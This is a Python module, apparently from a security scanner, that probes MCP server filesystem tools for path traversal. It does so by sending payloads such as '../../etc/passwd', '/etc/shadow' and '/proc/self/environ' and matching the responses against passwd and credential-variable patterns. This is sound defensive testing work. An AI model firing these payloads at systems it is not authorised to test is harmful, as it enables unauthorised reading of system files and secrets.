"""
Path Traversal Module
Targets: MCP servers with filesystem read/list tools.
Method: Sends traversal payloads as file path arguments and checks if server
        returns content from outside the configured base directory.
CWE-22: Improper Limitation of a Pathname to a Restricted Directory
"""

import re
from mcp import ClientSession
from mcp.types import CallToolResult

from .base import ScanModule
from ..models import Finding, FindingStatus, Severity


# Parameter names that likely accept file paths
PATH_PARAM_NAMES = [
    "path", "file", "filename", "filepath", "file_path",
    "directory", "dir", "location", "source", "dest",
    "target", "name", "resource", "uri",
]

# Tool names suggesting filesystem operations
FILESYSTEM_TOOL_KEYWORDS = [
    "read", "file", "get", "load", "fetch", "open",
    "list", "browse", "cat", "stat", "view", "show",
]

# Payloads ordered by likelihood of success
TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "/proc/self/environ",
    "../../../../../../etc/shadow",
]

# Evidence patterns that confirm exploitation
UNIX_PASSWD_PATTERNS = [
    re.compile(r"root:.*:/bin/(bash|sh|zsh|fish)", re.IGNORECASE),
    re.compile(r"\w+:x:\d+:\d+:"),         # standard passwd entry
    re.compile(r"(daemon|nobody|www-data):", re.IGNORECASE),
]

WINDOWS_PATTERNS = [
    re.compile(r"\[fonts\]", re.IGNORECASE),
    re.compile(r"127\.0\.0\.1\s+localhost"),
]

ENV_PATTERNS = [
    re.compile(r"(HOME|PATH|USER|SHELL)="),
    # Require KEY= or KEY: to avoid matching 'api_key' as a substring inside
    # tool names or error messages (e.g. 'cloud_create_api_key' contains 'api_key')
    re.compile(r"\b(AWS_ACCESS_KEY|SECRET_KEY|API_KEY)\s*[=:]", re.IGNORECASE),
]


def _extract_text(result: CallToolResult) -> str:
    """Pull text out of any MCP tool result content."""
    parts = []
    for item in result.content:
        if hasattr(item, "text"):
            parts.append(item.text)
        elif isinstance(item, dict) and "text" in item:
            parts.append(item["text"])
    return "\n".join(parts)


def _check_evidence(response_text: str) -> str | None:
    """Return evidence snippet if any exploitation pattern matches, else None."""
    for pattern in UNIX_PASSWD_PATTERNS + WINDOWS_PATTERNS + ENV_PATTERNS:
        match = pattern.search(response_text)
        if match:
            start = max(0, match.start() - 20)
            end = min(len(response_text), match.end() + 80)
            return response_text[start:end].strip()
    return None


def _is_filesystem_tool(tool: dict) -> bool:
    """Heuristic: does this tool likely read files?"""
    name = tool.get("name", "").lower()
    desc = tool.get("description", "").lower()
    schema = tool.get("inputSchema", {})
    param_names = [k.lower() for k in schema.get("properties", {}).keys()]

    # Check tool name
    for keyword in FILESYSTEM_TOOL_KEYWORDS:
        if keyword in name:
            break
    else:
        # Not a filesystem-keyword tool — check params
        if not any(p in param_names for p in PATH_PARAM_NAMES):
            return False

    # Check it has at least one path-like parameter
    return any(p in param_names for p in PATH_PARAM_NAMES)


def _get_path_params(tool: dict) -> list[str]:
    """Return parameter names that look like file paths."""
    schema = tool.get("inputSchema", {})
    properties = schema.get("properties", {})
    found = []
    for name, spec in properties.items():
        if name.lower() in PATH_PARAM_NAMES:
            found.append(name)
        elif "path" in name.lower() or "file" in name.lower():
            found.append(name)
    return found


class PathTraversalModule(ScanModule):
    module_id = "path_traversal"
    name = "Path Traversal"
    description = "Tests filesystem MCP tools for directory traversal (CWE-22) by sending ../../ payloads and checking if server returns out-of-scope file contents"

    async def run(self, session: ClientSession, tools: list[dict]) -> list[Finding]:
        findings: list[Finding] = []

        for tool in tools:
            if not _is_filesystem_tool(tool):
                continue

            tool_name = tool["name"]
            path_params = _get_path_params(tool)
            if not path_params:
                continue

            # Try each path parameter with each payload
            for param in path_params:
                for payload in TRAVERSAL_PAYLOADS:
                    try:
                        result = await session.call_tool(
                            tool_name,
                            arguments={param: payload}
                        )
                        response_text = _extract_text(result)
                        evidence = _check_evidence(response_text)

                        if evidence:
                            findings.append(Finding(
                                module_id=self.module_id,
                                title=f"Path Traversal in '{tool_name}' via '{param}' parameter",
                                severity=Severity.HIGH,
                                status=FindingStatus.CONFIRMED,
                                cvss_score=7.5,
                                description=(
                                    f"The MCP tool '{tool_name}' does not properly validate the '{param}' "
                                    f"parameter. An attacker can read arbitrary files on the server by "
                                    f"supplying a path traversal sequence such as '{payload}'."
                                ),
                                tool_name=tool_name,
                                payload_used=payload,
                                evidence=f"Server returned file content: {evidence}",
                                remediation=(
                                    "Resolve the provided path to an absolute path and verify it starts "
                                    "with the configured base directory before opening. Use "
                                    "os.path.realpath() and assert the result starts with the allowed base."
                                ),
                                payload_args={param: payload},
                                raw_request={"tool": tool_name, "arguments": {param: payload}},
                                raw_response=response_text[:1000],
                                cwe_id="CWE-22",
                            ))
                            # One confirmed finding per param is enough — stop trying more payloads
                            break

                    except Exception as exc:
                        error_msg = str(exc)
                        # Some error messages reveal path info — still a finding
                        if any(kw in error_msg.lower() for kw in
                               ["permission denied", "no such file", "/etc/", "c:\\", "passwd"]):
                            findings.append(Finding(
                                module_id=self.module_id,
                                title=f"Path Traversal Attempt — Error Reveals Server Paths in '{tool_name}'",
                                severity=Severity.MEDIUM,
                                status=FindingStatus.POTENTIAL,
                                cvss_score=5.3,
                                description=(
                                    f"Error message from '{tool_name}' reveals server filesystem paths, "
                                    f"indicating path traversal reached the filesystem layer."
                                ),
                                tool_name=tool_name,
                                payload_used=payload,
                                evidence=f"Error message: {error_msg[:300]}",
                                remediation="Sanitize error messages. Validate and restrict file paths to the configured base directory.",
                                raw_request={"tool": tool_name, "arguments": {param: payload}},
                                cwe_id="CWE-22",
                            ))
                            break

        return findings
